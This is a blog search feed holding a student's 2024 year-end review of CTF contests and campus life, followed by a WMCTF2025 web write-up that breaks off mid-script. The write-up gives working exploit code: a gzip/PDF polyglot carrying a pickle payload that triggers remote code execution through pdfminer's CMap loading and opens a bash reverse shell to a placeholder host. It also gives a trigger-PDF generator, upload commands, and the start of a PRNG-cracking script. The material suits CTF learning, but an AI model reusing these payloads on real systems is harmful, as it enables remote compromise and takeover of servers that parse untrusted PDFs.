<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2024年终总结</title>
    <link href="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>年终总个结。</p><h1 id="竞赛之路"><a href="#竞赛之路" class="headerlink" title="竞赛之路"></a>竞赛之路</h1><p>今年去了福建，天津，成都，广州，贵阳，大江南北真是路漫漫啊。<br>年初沉淀略过（</p><p>今年四月主动请缨，命运的齿轮也许就此开始转动。真的就感觉写男频小说一样啊。</p><p>我忘不了在福建三明红明谷的力不从心，初出茅庐但铩羽而归，前二十但一个奖没得到：</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231170513547.png" alt="image-20241231170513547"></p><p>我忘不了在天津大学的国赛半决赛前一晚的彻夜难眠，华北80进9残酷至极，还好有惊无险第五进线：</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231170556216.png" alt="image-20241231170556216"></p><p>我最最最最忘不了在四川大学国赛决赛的AWDP和渗透龙场悟道，直至击败大千世界所有竞争者，获得全国总冠军，国一中的国一。(上去领奖了嘻嘻，犹记得川大网安院院长站我右边，跟我说今年冠军又是北邮的，学长才是真正的神话啊ww)</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231170712495.png" alt="image-20241231170712495"></p><p>当然主办方临时让我作为代表发言让我更加局促不已(下面可是有院士啊卧槽了我何德何能。。。)</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231170836313.png" alt="image-20241231170836313"></p><p>我也忘不了在国家网络安全宣传周的广州羊城杯，学长们直接杀穿了靶场暴砍冠军，我们差几道ak的亚军：</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231170911882.png" alt="image-20241231170911882"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231170957541.png" alt="image-20241231170957541"></p><p>我忘不了在天津的京津冀攻防大赛，带着学弟一起历练，AWD的攻防连打之下又豪取冠军：</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231171407522.png" alt="image-20241231171407522"></p><p>我也忘不了今年最后一次线下，是天枢老学长们倾巢出动的贵阳网鼎杯，我勒个网络安全奥运会啊（</p><p>但是太抽象了，真的打不过。。。只能说菜真得多练吧。</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231171638104.png" alt="image-20241231171638104"></p><p>今年的比赛至此划一段落。我认为我是喜欢打CTF的。我很喜欢群里能第一个喊出“除了”“出了”“交了”的感觉，我喜欢线上一次次抢血解题的快意恩仇，我喜欢线下面对面搏杀的狭路相逢。</p><p>或许不知道什么时候我也不打了，但是我觉得它的确给我本就无趣的大学生活留下了浓墨重彩的一笔，此路虽关山难越，但仍落子无悔。</p><h1 id="社交方面"><a href="#社交方面" class="headerlink" title="社交方面"></a>社交方面</h1><p>一坨勾使。</p><p>为了什么比赛什么绩点，我感觉我的生活里少了太多社交，也少了太多生活的趣味。</p><p>我在上学期才慢慢想明白我的大学生活真的太无趣了。真的。</p><p>所以我慢慢开始改变，渐渐找到生活里的平衡点，但是我感觉还是有点太孤独了，也许。</p><p>今年又一个人去了天安门，清明节独自吊唁毛主席。</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231172746530.png" alt="image-20241231172746530"></p><p>五一今年又是一个人去音乐节，我也不知道自己瞎嗨什么，一切结束后只剩下我一个人慢慢的走，慢慢的走。</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231173013968.png" alt="image-20241231173013968"></p><p>在最后与其他人在赶上末班地铁的奔跑中，我仿佛才感觉到了我的存在：</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231173017589.png" alt="image-20241231173017589"></p><p>跟同学玩了些沉浸剧场，感觉挺爽的（中戏科班出身的演员真就是不一样啊，质感太好了）：</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231173232621.png" alt="image-20241231173232621"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231173342849.png" alt="image-20241231173342849"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231173345531.png" alt="image-20241231173345531"></p><p>也和三五好友喝了喝🍺，印象最深的就是那次直接晚上9点下课去drink，晚上睡KTV凌晨五点打烊了走回学校hhhh：</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231173616378.png" alt="image-20241231173616378"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231173622318.png" alt="image-20241231173622318"></p><p>我相信有一天台球技术也能练成像学长那样高手的。</p><p>国庆节的襄阳之行也是令人难忘啊</p><p>（被辐照偷拍</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231174133742.png" alt="image-20241231174133742"></p><p>星落如雨的打铁花，看痴了（下一年争取买个好点的相机出去玩能照好看点吧</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231174149017.png" alt="image-20241231174149017"></p><p>坐船感觉值回票价了：</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231174325010.png" alt="image-20241231174325010"></p><p>还有登神长阶的武当山：</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231174310098.png" alt="image-20241231174310098"></p><p>好像没玩啥了，玩的比较少。。</p><p>我觉得我还是得当一个现充。</p><p>🏀不常打了，现在被健身俘虏了，和魔鬼教练DoubleLi的训练也算卓有成效了hhh。</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/image-20241231175232348.png" alt="image-20241231175232348"></p><p>下一年没啥事了多打打🏀吧，就是北京冷得太快，室外打着太难受了。</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>其他的事情感觉没啥好讲的，就这样吧（期末还剩五科，你邮的网安大三上真是烂完了）</p><p>新的一年里希望能成为自己想要成为的人，多写点高质量博客，多拍点高质量照，多和值得玩的人一起玩。</p><p>（能成为现充吗？也许不太行。。。忙的一批）</p><p>祝各位能和今天陪自己跨年的人开开心心，幸福快乐。</p><p>千言万语汇成一句，2025共勉。</p>]]></content>
    
    
    
    <tags>
      
      <tag>其他</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WMCTF2025-WEB-Learning</title>
    <link href="/2025/09/26/WMCTF2025-WEB-Learning/"/>
    <url>/2025/09/26/WMCTF2025-WEB-Learning/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>简单看看。</p><h2 id="pdf2text"><a href="#pdf2text" class="headerlink" title="pdf2text"></a>pdf2text</h2><p>pickle找链子打反序列化。</p><p>最后的<code>pickle.loads</code>在：</p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162003698.png" alt="image-20250926162003698"></p><p>能参考到：</p><p><a href="https://github.com/pdfminer/pdfminer.six/blob/51683b2528e2aa685dd8b9e61f6ccf9f76a59a62/pdfminer/cmapdb.py#L233-L249">pdfminer.six&#x2F;pdfminer&#x2F;cmapdb.py at 51683b2528e2aa685dd8b9e61f6ccf9f76a59a62 · pdfminer&#x2F;pdfminer.six · GitHub</a></p><p>可以跟一下<code>GadGet</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">high_level.py::extract_pages()<br>pdfinterp.py::PDFPageInterpreter.process_page(page)<br>pdfinterp.py::PDFPageInterpreter.render_contents(resources, contents)<br>pdfinterp.py::PDFPageInterpreter.init_resources(resources)<br>pdfinterp.py::PDFResourceManager.get_font(objid, spec)<br>pdffont.py::PDFCIDFont.__init__(rsrcmgr, spec, strict)<br>pdffont.py::PDFCIDFont.get_cmap_from_spec(spec, strict)<br>cmapdb.py::CMapDB.get_cmap(cmap_name)<br>cmapdb.py::CMapDB._load_data(name)<br></code></pre></td></tr></table></figure><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162041089.png" alt="image-20250926162041089"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162136128.png" alt="image-20250926162136128"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162155329.png" alt="image-20250926162155329"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162214328.png" alt="image-20250926162214328"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162228313.png" alt="image-20250926162228313"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162244289.png" alt="image-20250926162244289"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162252269.png" alt="image-20250926162252269"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162301023.png" alt="image-20250926162301023"></p><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162315188.png" alt="image-20250926162315188"></p><p>思路就是先打一个gzip压缩并能绕过PDF检测的含恶意Opcode数据文件进去（可以手搓也可<code>pickle.dumps</code>生成），至此留下恶意pickle数据；</p><p>之后再打入一个恶意pdf文件触发上述<code>GadGet</code>的<code>pickle.loads</code>反序列化RCE。</p><p>注意pdfminer会在前约 1KB范围内扫描 <code>%PDF-</code>，而不要求从<code>offset 0</code>开始；一旦找到就按 PDF 规范继续解析。据此可构造类似polyglot的既是合法 <code>PDF</code>、又能被 <code>gzip</code> 按规范读取的<code>evil.pickle.gz</code>。</p><p>本来<code>/</code>过不去，但是生成pdf时<code>/Encoding</code>指向pickle.gz绝对路径，所以可以直接用<code>#2F</code>转义绕过 PDFName对象限制：</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><h4 id="genPickle-py"><a href="#genPickle-py" class="headerlink" title="genPickle.py"></a>genPickle.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib, struct, pickle, binascii<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_pdf</span>(<span class="hljs-params">abs_base: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    header = <span class="hljs-string">b&quot;%PDF-1.7\n%\xe2\xe3\xcf\xd3\n&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">obj</span>(<span class="hljs-params">n, body: <span class="hljs-built_in">bytes</span></span>): <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;n&#125;</span> 0 obj\n&quot;</span>.encode()+body+<span class="hljs-string">b&quot;\nendobj\n&quot;</span><br><br>    objs = []<br>    objs.append(obj(<span class="hljs-number">1</span>, <span class="hljs-string">b&quot;&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;&quot;</span>))<br>    objs.append(obj(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;&lt;&lt; /Type /Pages /Count 1 /Kids [3 0 R] &gt;&gt;&quot;</span>))<br>    page = <span class="hljs-string">b&quot;&lt;&lt; /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources &lt;&lt; /Font &lt;&lt; /F1 4 0 R &gt;&gt; &gt;&gt; /Contents 5 0 R &gt;&gt;&quot;</span><br>    objs.append(obj(<span class="hljs-number">3</span>, page))<br>    objs.append(obj(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;&lt;&lt; /Type /Font /Subtype /Type1 /BaseFont /Helvetica &gt;&gt;&quot;</span>))<br>    stream = <span class="hljs-string">b&quot;BT /F1 12 Tf (hello polyglot) Tj ET&quot;</span><br>    objs.append(obj(<span class="hljs-number">5</span>, <span class="hljs-string">b&quot;&lt;&lt; /Length %d &gt;&gt;\nstream\n&quot;</span> % <span class="hljs-built_in">len</span>(stream) + stream + <span class="hljs-string">b&quot;\nendstream&quot;</span>))<br><br>    body = header<br>    offsets_abs = []<br>    cursor_abs = abs_base + <span class="hljs-built_in">len</span>(header)<br>    <span class="hljs-keyword">for</span> o <span class="hljs-keyword">in</span> objs:<br>        offsets_abs.append(cursor_abs)<br>        body += o<br>        cursor_abs += <span class="hljs-built_in">len</span>(o)<br><br>    <span class="hljs-comment"># xref stream (/W [1 4 2])：type(1B)+offset(4B BE)+gen(2B)</span><br>    entries = [<span class="hljs-string">b&quot;\x01&quot;</span> + struct.pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, off) + <span class="hljs-string">b&quot;\x00\x00&quot;</span> <span class="hljs-keyword">for</span> off <span class="hljs-keyword">in</span> offsets_abs]<br>    xref_stream = zlib.compress(<span class="hljs-string">b&quot;&quot;</span>.join(entries))<br>    xref_obj = (<br>        <span class="hljs-string">b&quot;6 0 obj\n&quot;</span><br>        <span class="hljs-string">b&quot;&lt;&lt; /Type /XRef /Size 7 /Root 1 0 R /W [1 4 2] /Index [1 5] &quot;</span><br>        <span class="hljs-string">b&quot;/Filter /FlateDecode /Length &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(xref_stream)).encode() + <span class="hljs-string">b&quot; &gt;&gt;\nstream\n&quot;</span> +<br>        xref_stream + <span class="hljs-string">b&quot;\nendstream\nendobj\n&quot;</span><br>    )<br><br>    startxref_abs = abs_base + <span class="hljs-built_in">len</span>(body)<br>    trailer = <span class="hljs-string">b&quot;startxref\n&quot;</span> + <span class="hljs-built_in">str</span>(startxref_abs).encode() + <span class="hljs-string">b&quot;\n%%EOF\n&quot;</span><br>    <span class="hljs-keyword">return</span> body + xref_obj + trailer<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_gzip_with_extra</span>(<span class="hljs-params">extra_pdf: <span class="hljs-built_in">bytes</span>, payload: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    ID1, ID2, CM = <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">8</span><br>    FLG, MTIME, XFL, OS = <span class="hljs-number">0x04</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">255</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(extra_pdf) &gt; <span class="hljs-number">65535</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;FEXTRA &gt;65535&quot;</span>)<br><br>    header  = <span class="hljs-built_in">bytes</span>([ID1, ID2, CM, FLG])<br>    header += struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, MTIME)<br>    header += <span class="hljs-built_in">bytes</span>([XFL, OS])<br>    header += struct.pack(<span class="hljs-string">&quot;&lt;H&quot;</span>, <span class="hljs-built_in">len</span>(extra_pdf))<br>    header += extra_pdf<br><br>    comp = zlib.compressobj(level=<span class="hljs-number">9</span>, wbits=-<span class="hljs-number">15</span>)<br>    deflated = comp.compress(payload) + comp.flush()<br><br>    crc   = binascii.crc32(payload) &amp; <span class="hljs-number">0xffffffff</span><br>    isize = <span class="hljs-built_in">len</span>(payload) &amp; <span class="hljs-number">0xffffffff</span><br>    trailer = struct.pack(<span class="hljs-string">&quot;&lt;II&quot;</span>, crc, isize)<br><br>    <span class="hljs-keyword">return</span> header + deflated + trailer<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cmd = <span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1&#x27;&quot;</span><br><br>    expr = (<br>        <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(%r) or &quot;</span><br>        <span class="hljs-string">&quot;&#123;&#x27;decode&#x27;: (lambda self, b: [])&#125;&quot;</span><br>    ) % cmd<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">POC</span>:<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>            <span class="hljs-keyword">import</span> builtins<br>            <span class="hljs-keyword">return</span> (builtins.<span class="hljs-built_in">eval</span>, (expr,))<br><br>    payload = pickle.dumps(POC(), protocol=<span class="hljs-number">2</span>)<br><br>    pdf = build_pdf(abs_base=<span class="hljs-number">12</span>)<br>    poly = build_gzip_with_extra(extra_pdf=pdf, payload=payload)<br><br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;evil.pickle.gz&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(poly)<br>    <span class="hljs-keyword">assert</span> poly[:<span class="hljs-number">4</span>] == <span class="hljs-string">b&quot;\x1f\x8b\x08\x04&quot;</span><br>    <span class="hljs-keyword">assert</span> poly.find(<span class="hljs-string">b&quot;%PDF-&quot;</span>) != -<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> poly.find(<span class="hljs-string">b&quot;%PDF-&quot;</span>) &lt; <span class="hljs-number">1024</span><br></code></pre></td></tr></table></figure><h4 id="genPDF-py"><a href="#genPDF-py" class="headerlink" title="genPDF.py"></a>genPDF.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_pdf_name_abs</span>(<span class="hljs-params">abs_path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/&quot;</span> + abs_path.replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;#2F&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_trigger_pdf</span>(<span class="hljs-params">cmap_abs_no_ext: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    enc_name = encode_pdf_name_abs(cmap_abs_no_ext)<br>    header = <span class="hljs-string">b&quot;%PDF-1.4\n%\xe2\xe3\xcf\xd3\n&quot;</span><br>    objs = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">obj</span>(<span class="hljs-params">n, body: <span class="hljs-built_in">bytes</span></span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;n&#125;</span> 0 obj\n&quot;</span>.encode() + body + <span class="hljs-string">b&quot;\nendobj\n&quot;</span><br><br>    objs.append(obj(<span class="hljs-number">1</span>, <span class="hljs-string">b&quot;&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;&quot;</span>))<br>    objs.append(obj(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;&lt;&lt; /Type /Pages /Count 1 /Kids [3 0 R] &gt;&gt;&quot;</span>))<br>    page = <span class="hljs-string">b&quot;&lt;&lt; /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources &lt;&lt; /Font &lt;&lt; /F1 5 0 R &gt;&gt; &gt;&gt; /Contents 4 0 R &gt;&gt;&quot;</span><br>    objs.append(obj(<span class="hljs-number">3</span>, page))<br>    stream = <span class="hljs-string">b&quot;BT /F1 12 Tf (A) Tj ET&quot;</span><br>    objs.append(obj(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;&lt;&lt; /Length %d &gt;&gt;\nstream\n&quot;</span> % <span class="hljs-built_in">len</span>(stream) + stream + <span class="hljs-string">b&quot;\nendstream&quot;</span>))<br>    font_dict = <span class="hljs-string">f&quot;&lt;&lt; /Type /Font /Subtype /Type0 /BaseFont /Identity-H /Encoding <span class="hljs-subst">&#123;enc_name&#125;</span> /DescendantFonts [6 0 R] &gt;&gt;&quot;</span>.encode()<br>    objs.append(obj(<span class="hljs-number">5</span>, font_dict))<br>    objs.append(obj(<span class="hljs-number">6</span>, <span class="hljs-string">b&quot;&lt;&lt; /Type /Font /Subtype /CIDFontType2 /BaseFont /Dummy /CIDSystemInfo &lt;&lt; /Registry (Adobe) /Ordering (Identity) /Supplement 0 &gt;&gt; &gt;&gt;&quot;</span>))<br><br>    buf = io.BytesIO()<br>    buf.write(header)<br>    offsets = []<br>    cursor = <span class="hljs-built_in">len</span>(header)<br>    <span class="hljs-keyword">for</span> o <span class="hljs-keyword">in</span> objs:<br>        offsets.append(cursor)<br>        buf.write(o)<br>        cursor += <span class="hljs-built_in">len</span>(o)<br><br>    xref_start = buf.tell()<br>    buf.write(<span class="hljs-string">b&quot;xref\n0 7\n&quot;</span>)<br>    buf.write(<span class="hljs-string">b&quot;0000000000 65535 f \n&quot;</span>)<br>    <span class="hljs-keyword">for</span> off <span class="hljs-keyword">in</span> offsets:<br>        buf.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;off:<span class="hljs-number">0</span>10d&#125;</span> 00000 n \n&quot;</span>.encode())<br>    buf.write(<span class="hljs-string">b&quot;trailer\n&lt;&lt; /Size 7 /Root 1 0 R &gt;&gt;\n&quot;</span>)<br>    buf.write(<span class="hljs-string">f&quot;startxref\n<span class="hljs-subst">&#123;xref_start&#125;</span>\n%%EOF\n&quot;</span>.encode())<br>    <span class="hljs-keyword">return</span> buf.getvalue()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    abs_no_ext = <span class="hljs-string">&quot;/proc/self/cwd/uploads/evil&quot;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;trigger.pdf&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(build_trigger_pdf(abs_no_ext))<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -sS -F <span class="hljs-string">&quot;file=@evil.pickle.gz;type=application/pdf;filename=evil.pickle.gz&quot;</span>   http://localhost:11451/upload | sed -n <span class="hljs-string">&#x27;1,80p&#x27;</span><br><br>curl -sS -F <span class="hljs-string">&quot;file=@trigger.pdf;type=application/pdf;filename=trigger.pdf&quot;</span>   http://localhost:11451/upload | sed -n <span class="hljs-string">&#x27;1,120p&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250926162922074.png" alt="image-20250926162922074"></p><p>这道感觉还好，毕竟很多都可以用现在的ai拷打出来。。。（</p><h2 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h2><p>随机数的一个trick，访问624次之后就可以获取构造；</p><p>题目就给了个<code>__builtin__</code>少了个s，所以是误导项。。。</p><p><a href="https://stackered.com/blog/python-random-prediction/?utm_source=chatgpt.com#similarities-with-php">Breaking Python’s PRNG with a few values and no bruteforce</a></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>等爆破吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pyrandcracker <span class="hljs-keyword">import</span> RandCracker<br><span class="hljs-keyword">import</span> time, random, requests, json, os<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><br>rd = random.Random()<br><br>url = <span class="hljs-string">&#x27;http://localhost:11452&#x27;</span><br><br>data = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>)):<br><br>    res = requests.post(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/register&#x27;</span>, json=&#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-built_in">str</span>(os.urandom(<span class="hljs-number">10</span>)),<br>        <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;123&#x27;</span><br>    &#125;)<br><br>    <span class="hljs-keyword">try</span>:<br>        user_id = res.json()[<span class="hljs-string">&#x27;user_id&#x27;</span>]<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(res.text)<br><br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    data.append(<span class="hljs-built_in">int</span>(user_id))<br><br><span class="hljs-comment"># 